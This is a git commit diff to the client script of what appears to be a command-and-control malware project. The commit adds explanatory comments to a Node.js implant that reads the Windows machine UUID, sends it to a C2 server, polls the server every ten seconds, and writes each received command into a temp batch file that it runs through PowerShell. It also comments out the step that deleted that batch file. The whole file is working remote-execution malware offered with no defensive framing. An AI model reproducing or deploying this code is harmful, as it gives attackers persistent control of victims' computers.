7d1fff95944da8d063004e075981140d46cce72d
Bora <94760052+BoraOfficial@users.noreply.github.com>
2022-11-17 17:45:43 +0300

    Update script.js

--- client/script.js
+++ client/script.js
@@ -1,52 +1,61 @@
-var website_ip = "http://127.0.0.1:8000"
-var payload = ["[INSERT PAYLOAD]"]
-const axios = require('axios');
+// some variables
+var website_ip = "http://127.0.0.1:8000" // command and control server ip and port
+var payload = ["[INSERT PAYLOAD]"] // placeholder
+// imports
+const axios = require('axios'); // you might need to install it --> npm install axios
 const fs = require('fs');
 const os = require("os");
 const { spawn } = require( 'child_process' );
+// get uuid of machine 
 const uuid = spawn( 'cmd', [ '/c', 'wmic', "path", "win32_computersystemproduct", "get", "uuid" ] );
-
+// write exec_script.bat to temp as a placeholder
 fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "");
 
+// read the uuid
 uuid.stdout.on( 'data', ( data ) => parseUUID( `stdout: ${ data }` ) );
 uuid.on('close', ( code ) => console.log( `child process exited with code ${code}` ))
 
+// parse the uuid
 function parseUUID(uuid){
-    sendUUID(uuid.toString().split("\n")[1].replaceAll("\r", "").replaceAll(" ", ""))
+    sendUUID(uuid.toString().split("\n")[1].replaceAll("\r", "").replaceAll(" ", "")) // beautifies the uuid and removes all the other junk
 }
 
+// send uuid to the command and control server
 function sendUUID(uuid){
     const data = {
         uuid: uuid
     };
-    axios.post('http://127.0.0.1:8000', data)
+    axios.post(website_ip, data)
 }
 
 
-function logEvery2Seconds(i) {
+// GET command and control server's command
+function logEvery2Seconds(i) { // [UPDATE] changed from 2 seconds to 10 seconds
     setTimeout(() => {
         axios.get(website_ip+'/backend/')
             .then(function (response) {
-                // handle success
+                // if command already in executed payloads
                 if(payload[0] == response.data){
                     console.log("Payload already executed!")
 
-                } else {
-                    payload.pop()
-                    payload.push(response.data)
-                    console.log(response.data)
-                    fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "powershell.exe -command "+response.data);
-                    spawn('cmd.exe', ["/c", "%temp%\\exec_script.bat"])
+                } else { // if it isnt
+                    payload.pop() // remove the already executed payload
+                    payload.push(response.data) // add the current payload
+                    // console.log(response.data)
+                    fs.writeFileSync(os.tmpdir()+'\\exec_script.bat', "powershell.exe -command "+response.data); // write the payload to %temp%\exec_script.bat
+                    spawn('cmd.exe', ["/c", "%temp%\\exec_script.bat"]) // execute the payload written into %temp%\exec_script.bat
+                    /*
                     setInterval(() => {
-                        spawn('cmd.exe', ["/c", "del", "/f", "%temp%\\exec_script.bat"])
+                        spawn('cmd.exe', ["/c", "del", "/f", "%temp%\\exec_script.bat"]) // delete script after 1.5 secs
                     }, 1500)
+                    */
 
                     
                 }
                 
         })
         console.log('Check /backend/ for command');
-        logEvery2Seconds(++i);
+        logEvery2Seconds(++i); // calls itself again (infinite loop )
     }, 10000)
 }
 
@@ -54,5 +63,5 @@ logEvery2Seconds(0);
 
 let i = 0;
 setInterval(() => {
-    console.log('Infinite Loop Test interval n:', i++);
+    console.log('Infinite Loop Test interval n:', i++); // tells how much logEvery2Seconds() was executed
 }, 10000)
